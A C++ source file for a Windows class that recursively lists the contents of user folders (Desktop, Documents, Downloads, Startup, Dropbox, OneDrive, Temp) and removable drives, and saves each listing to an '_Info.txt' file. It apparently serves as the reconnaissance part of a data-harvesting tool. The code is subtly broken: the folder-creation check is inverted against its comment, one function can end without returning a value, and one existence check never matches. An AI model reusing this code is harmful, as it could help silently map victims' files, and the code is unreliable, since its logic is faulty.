#include "DirectoryTree.h"
#include <iostream>
#include <Windows.h>
#include <Shlwapi.h>
#include <sstream>
#include <regex>
#include <fstream>
#include <ShlObj.h>  

#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#include <experimental/filesystem>
namespace fs = std::experimental::filesystem;

#pragma comment(lib,"Shlwapi.lib")
using namespace std;

// Declare a static vector initialized with special folder paths
vector<string> DirectoryTree::TargetDirs = DirectoryTree::GetSpecialFolderPaths();

// Function to recursively retrieve the directory structure starting from a given path
std::string DirectoryTree::GetDirectoryTree(std::string path, int deep)
{
    HANDLE hFind; // Handle for the file search
    WIN32_FIND_DATAA findData; // Struct to store file information
    string searchPath = path + "\\*"; // Search pattern for all files and folders in the directory
    hFind = FindFirstFileA(searchPath.c_str(), &findData); // Find the first file in the directory

    ostringstream builder; // String stream to build the directory structure output

    if (hFind != INVALID_HANDLE_VALUE) { // Check if the directory is valid
        // Add the current directory to the output with indentation based on depth
        builder << string(deep * 4, ' ') << "[+] " << path.substr(path.find_last_of("\\") + 1) << "\\" << endl;

        do {
            // Skip the current (".") and parent ("..") directory entries
            if (!strcmp(findData.cFileName, ".") || !strcmp(findData.cFileName, "..")) continue;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // If it's a subdirectory, recursively process it
                string subDirPath = path + "\\" + findData.cFileName;
                builder << GetDirectoryTree(subDirPath, deep + 1);
            }
            else {
                // Otherwise, it's a file; add it to the output with indentation
                builder << string(deep * 4, ' ') << "\t[-] " << findData.cFileName << endl;
            }
        } while (FindNextFileA(hFind, &findData)); // Continue finding the next file

        FindClose(hFind); // Close the file search handle
    }

    return builder.str(); // Return the built directory structure as a string
}

// Function to extract or adjust the directory name from a given path
std::string DirectoryTree::GetDirectoryName(std::string path)
{
    string str = "\\"; // Backslash for appending if not already present
    if (path.back() != 92) { // Check if the path doesn't end with a backslash
        path += str; // Append backslash
    }

    regex pattern(R"(^[A-Za-z]:\\$)"); // Regex pattern to match root drive (e.g., "C:\")

    if (regex_match(path, pattern)) { // If the path matches the root drive format
        char volumePath[MAX_PATH];
        if (GetVolumePathNameA(path.c_str(), volumePath, MAX_PATH)) {
            // Get and return the root volume path (e.g., "C:")
            return string(volumePath, 1);
        }
    }

    DWORD attribute = GetFileAttributesA(path.c_str()); // Get file attributes
    if (attribute != INVALID_FILE_ATTRIBUTES && attribute & FILE_ATTRIBUTE_DIRECTORY) {
        // If it's a valid directory and ends with a backslash, remove it
        if (!path.empty() && path.back() == '\\') {
            path.erase(path.size() - 1);
        }
        // Extract and return the directory name
        return path.substr(path.find_last_of("\\") + 1);
    }
}

// Function to get the path of a special folder by its CSIDL identifier
std::string DirectoryTree::GetSpecialFolderPath(int nFolder)
{
    char szPath[MAX_PATH]; // Buffer to store the folder path
    if (SHGetSpecialFolderPathA(NULL, szPath, nFolder, FALSE)) {
        // Return the path as a string if successful
        return string(szPath);
    }
    else {
        return ""; // Return an empty string if unsuccessful
    }
}

// Function to get paths of various special folders
std::vector<std::string> DirectoryTree::GetSpecialFolderPaths()
{
    vector<string> dirs = { // List of commonly used special folder paths
        GetSpecialFolderPath(CSIDL_DESKTOP),
        GetSpecialFolderPath(CSIDL_PERSONAL),
        GetSpecialFolderPath(CSIDL_MYPICTURES),
        GetSpecialFolderPath(CSIDL_MYVIDEO),
        GetSpecialFolderPath(CSIDL_STARTUP),
        GetSpecialFolderPath(CSIDL_PROFILE) + "\\Downloads",
        GetSpecialFolderPath(CSIDL_PROFILE) + "\\Dropbox",
        GetSpecialFolderPath(CSIDL_PROFILE) + "\\OneDrive",
        GetSpecialFolderPath(CSIDL_PROFILE) + "\\AppData\\Local\\Temp"
    };

    return dirs; // Return the list of special folder paths
}

// Function to get paths of removable drives (e.g., USB, CD-ROM)
std::vector<std::string> DirectoryTree::GetRemovableDrivePaths()
{
    vector<string> paths; // List to store removable drive paths

    char szDrives[MAX_PATH]; // Buffer to store drive strings
    if (GetLogicalDriveStringsA(MAX_PATH, szDrives)) { // Get all logical drives
        char* pDrive = szDrives;
        while (*pDrive) { // Iterate over each drive
            UINT uType = GetDriveTypeA(pDrive); // Get the type of the drive
            if (uType == DRIVE_REMOVABLE || uType == DRIVE_CDROM) {
                // If it's a removable or CD-ROM drive, add to the list
                paths.push_back(string(pDrive));
            }
            pDrive += lstrlenA(pDrive) + 1; // Move to the next drive string
        }
    }

    return paths; // Return the list of removable drive paths
}

// Function to save directory structures to a specified path
void DirectoryTree::SaveDirectories(std::string sSavePath)
{
    if (fs::create_directories(sSavePath)) { // Create directories if they don't exist
        return; // Exit if unable to create
    }

    vector<string> TargetDirs = GetSpecialFolderPaths(); // Get special folder paths

    vector<string> RemovableDrives = GetRemovableDrivePaths(); // Get removable drive paths
    for (auto& path : RemovableDrives) {
        TargetDirs.push_back(path); // Add removable drive paths to target directories
    }

    for (auto& path : TargetDirs) { // Iterate over target directories
        try {
            string results = GetDirectoryTree(path); // Get directory tree for the path
            string dirname = GetDirectoryName(path); // Get the directory name
            if (results != "Directory not exists") { // Check if the directory exists
                string filename = sSavePath + "\\" + dirname + "_Info" + ".txt";
                ofstream ofs(filename); // Create an output file
                if (ofs.is_open()) { // Write the directory structure to the file
                    ofs << results;
                    ofs.close();
                }
            }
        }
        catch (...) {
            // Catch and ignore exceptions
        }
    }
}



